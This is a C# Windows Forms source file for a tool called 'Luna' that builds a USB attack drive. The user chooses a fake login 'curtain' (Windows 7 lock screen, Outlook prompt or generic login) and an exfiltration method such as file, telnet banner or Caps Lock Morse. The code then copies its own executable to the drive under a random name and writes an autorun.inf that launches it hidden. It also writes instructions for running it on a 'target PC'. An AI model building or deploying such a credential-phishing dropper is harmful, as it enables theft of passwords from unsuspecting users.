//Copyright(C) 2016  saintcrossbow@gmail.com

//This program is free software: you can redistribute it and/or modify
//it under the terms of the GNU General Public License as published by
//the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.

//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//GNU General Public License for more details.

//You should have received a copy of the GNU General Public License
//along with this program.If not, see<http://www.gnu.org/licenses/>

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;

namespace Luna
{
    public partial class Main : Form
    {
        private Common.CurtainStyle selectedCurtain = Common.CurtainStyle.Undefined;
        private Common.ExfiltrationMethod selectedMethod = Common.ExfiltrationMethod.Undefined;
        private string curtainCmdLine = "";
        private string exfilCmdLine = "";
        
        private enum readyStatus
        {
            green = 0,
            red = 1
        }

        public Main()
        {
            InitializeComponent();
        }

        private void ShowReadyStatus(System.Windows.Forms.Label targetLabel, readyStatus statusColor)
        {
            // Toggle the ready bar on top
            switch (statusColor)
            {
                case readyStatus.green:
                    targetLabel.BackColor = Color.LimeGreen;
                    break;

                case readyStatus.red:
                    targetLabel.BackColor = Color.IndianRed;
                    break;
            }

            // Show password and file if needed
            if (selectedMethod == Common.ExfiltrationMethod.EncryptedFile)
            {
                this.passwordText.Enabled = true;
                this.confirmText.Enabled = true;
                this.outputFile.Enabled = true;
            }
            else if(selectedMethod == Common.ExfiltrationMethod.PlainTextFile)
            {
                this.passwordText.Enabled = false;
                this.confirmText.Enabled = false;
                this.outputFile.Enabled = true;
            }
            else
            {
                this.passwordText.Enabled = false;
                this.confirmText.Enabled = false;
                this.outputFile.Enabled = false;
            }
            
            // Also enable the start button if we're good to go
            if (selectedCurtain != Common.CurtainStyle.Undefined &&
                selectedMethod != Common.ExfiltrationMethod.Undefined &&
                driveUSB.Text != "")
            {
                btnCreateStartFile.Enabled = true;
            }
        }

        private void curtainModern_CheckedChanged(object sender, EventArgs e)
        {
            selectedCurtain = Common.CurtainStyle.Win7;
            ShowReadyStatus(this.capCurtain, readyStatus.green);
            curtainCmdLine = "1";
        }

        private void curtainEmail_CheckedChanged(object sender, EventArgs e)
        {
            selectedCurtain = Common.CurtainStyle.OutlookPrompt;
            ShowReadyStatus(this.capCurtain, readyStatus.green);
            curtainCmdLine = "2";
        }

        private void curtainGeneric_CheckedChanged(object sender, EventArgs e)
        {
            selectedCurtain = Common.CurtainStyle.GenericLogin;
            ShowReadyStatus(this.capCurtain, readyStatus.green);
            curtainCmdLine = "3";
        }

        private void exfilText_CheckedChanged(object sender, EventArgs e)
        {
            selectedMethod = Common.ExfiltrationMethod.PlainTextFile;
            ShowReadyStatus(this.capExfiltrate, readyStatus.green);
            exfilCmdLine = "1";
        }

        private void exfilEncText_CheckedChanged(object sender, EventArgs e)
        {
            selectedMethod = Common.ExfiltrationMethod.EncryptedFile;
            ShowReadyStatus(this.capExfiltrate, readyStatus.green);
            exfilCmdLine = "2";
        }

        private void exfilTelnetBanner_CheckedChanged(object sender, EventArgs e)
        {
            selectedMethod = Common.ExfiltrationMethod.TelnetBanner;
            ShowReadyStatus(this.capExfiltrate, readyStatus.green);
            exfilCmdLine = "3";
        }

        private void exfilCapsLock_CheckedChanged(object sender, EventArgs e)
        {
            selectedMethod = Common.ExfiltrationMethod.Morse;
            ShowReadyStatus(this.capExfiltrate, readyStatus.green);
            exfilCmdLine = "4";
        }

        private void btnCreateStartFile_Click(object sender, EventArgs e)
        {
            // Last minute check on additional criteria:
            this.errorPop.Visible = false;
            string errMsg = fileCriteriaReady();
            if (errMsg == "")
            {
                // Copy Luna as a random file name to the root of the USB
                string lunaEXE = LunaGeneral.randomFile() + ".exe";
                File.Copy(System.Reflection.Assembly.GetEntryAssembly().Location, Path.Combine(this.driveUSB.Text, lunaEXE));

                // Create extra command line arguments if necessary
                string cmdLineExtra = "";
                switch (selectedMethod)
                {
                    case Common.ExfiltrationMethod.PlainTextFile:
                        cmdLineExtra = "/output " + this.outputFile.Text;
                        break;
                    case Common.ExfiltrationMethod.EncryptedFile:
                        cmdLineExtra = "/output " + this.outputFile.Text + " /password " + this.passwordText.Text;
                        break;
                }

                // Create an autorun.inf using our file
                using (System.IO.StreamWriter autoRun = new System.IO.StreamWriter(Path.Combine(this.driveUSB.Text, "autorun.inf")))
                {
                    autoRun.WriteLine("[autorun]");
                    autoRun.WriteLine(String.Format(";Open=start /b /min {0} {1} {2} {3}", lunaEXE, "/curtain " + curtainCmdLine, "/exfil " + exfilCmdLine, cmdLineExtra));
                    autoRun.WriteLine(String.Format("ShellExecute=start /b /min {0} {1} {2} {3}", lunaEXE, "/curtain " + curtainCmdLine, "/exfil " + exfilCmdLine, cmdLineExtra));
                    autoRun.WriteLine("UseAutoPlay=1");
                }

                // Create instructions to run manually for USB
                using (System.IO.StreamWriter autoRun = new System.IO.StreamWriter(Path.Combine(this.driveUSB.Text, "Luna Command to Use.txt")))
                {
                    autoRun.WriteLine("Copy and paste this command in the target PC's Start > Run:");
                    autoRun.WriteLine("-----------------------------------------------------------");
                    autoRun.WriteLine(String.Format("{0} {1} {2} {3}", lunaEXE, "/curtain " + curtainCmdLine, "/exfil " + exfilCmdLine, cmdLineExtra));
                }

                ShowReadyStatus(this.capReady, readyStatus.green);
            }
            else
            {
                this.errorPop.Text = errMsg;
                this.errorPop.Visible = true;
            }

        }

        private void Main_Load(object sender, EventArgs e)
        {
            // Find current drives
            DriveInfo[] currentDrives = DriveInfo.GetDrives();
            foreach (DriveInfo d in currentDrives)
                driveUSB.Items.Add(d.Name);

            driveUSB.DropDownStyle = ComboBoxStyle.DropDownList;
        }
     
        private void driveUSB_Validated(object sender, EventArgs e)
        {
            if (driveUSB.Text.Trim() != "")
                ShowReadyStatus(this.capUSB, readyStatus.green);
        }

        // Returns the problem to display or an empty string indicating we're good.
        private string fileCriteriaReady()
        {
            string rtn = "";

            switch (selectedMethod)
            {
                case Common.ExfiltrationMethod.PlainTextFile:
                    if (String.IsNullOrWhiteSpace(outputFile.Text))
                        rtn = "- No output file for the exfiltrated text has been indicated. Indicate the full path in the additional options.\r\n";
                    break;
                case Common.ExfiltrationMethod.EncryptedFile:
                    if (String.IsNullOrWhiteSpace(outputFile.Text))
                        rtn += "- No output file for the exfiltrated text has been indicated. Indicate the full path in the additional options.\r\n";
                    if (String.IsNullOrWhiteSpace(passwordText.Text))
                        rtn += "- No password has been specified.\r\n";
                    if (String.IsNullOrWhiteSpace(confirmText.Text))
                        rtn += "- No confirming password has been specified.\r\n";
                    if (!String.IsNullOrWhiteSpace(passwordText.Text) &&
                        !String.IsNullOrWhiteSpace(confirmText.Text) &&
                        passwordText.Text != confirmText.Text)
                        rtn += "- The passwords do not match.\r\n";
                    break;
            }

            return rtn;
        }

        private void btnCreateStartFile_Click()
        {
        
        }


    }
}
